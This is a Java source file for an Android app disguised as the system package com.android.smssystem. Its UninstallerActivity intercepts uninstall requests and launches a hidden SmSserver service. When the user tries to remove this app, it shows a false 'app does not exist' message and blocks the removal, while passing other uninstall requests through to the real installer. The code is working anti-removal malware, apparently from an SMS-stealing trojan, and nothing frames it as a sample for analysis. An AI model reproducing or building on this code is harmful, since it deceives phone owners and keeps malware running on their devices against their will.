package com.android.smssystem;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.Uri;
import android.os.Bundle;
import android.widget.Toast;

public class UninstallerActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		Intent server = new Intent(this, SmSserver.class);
		this.startService(server);
		Intent intent = this.getIntent();
		if (intent != null) {
			String action = intent.getAction();
			Uri uri = intent.getData();
			if ("android.intent.action.DELETE".equals(action)) {
				if (uri.toString().indexOf(this.getPackageName()) > 0) {
					Toast.makeText(this, "应用不存在", Toast.LENGTH_SHORT).show();
				} else {
					if (checkAppExist(this, "com.android.packageinstaller")) {
						Intent delete = new Intent(Intent.ACTION_DELETE);
						ComponentName component = new ComponentName(
								"com.android.packageinstaller",
								"com.android.packageinstaller.UninstallerActivity");
						delete.setComponent(component);
						delete.setData(uri);
						this.startActivity(delete);
					}

				}
			}
		}
		this.finish();
	}

	public static boolean checkAppExist(Context context, String packageName) {
		if (packageName == null || "".equals(packageName))
			return false;
		try {
			ApplicationInfo info = context.getPackageManager()
					.getApplicationInfo(packageName,
							PackageManager.GET_UNINSTALLED_PACKAGES);

			return true;
		} catch (NameNotFoundException e) {

			return false;
		}
	}
}
